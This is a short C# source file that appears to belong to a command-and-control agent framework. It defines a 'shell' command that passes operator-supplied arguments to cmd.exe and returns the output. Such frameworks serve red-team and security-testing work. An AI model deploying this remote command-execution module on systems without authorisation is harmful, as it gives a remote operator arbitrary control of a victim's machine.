using Agent.Models;

namespace Agent.Commands
{
    public class Shell : AgentCommand
    {
        public override string Name => "shell";

        public override string Execute(AgentTask task)
        {
            var args = @"/c " + string.Join(" ", task.Arguments);
            return Internal.Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", args);
        }
    }
}
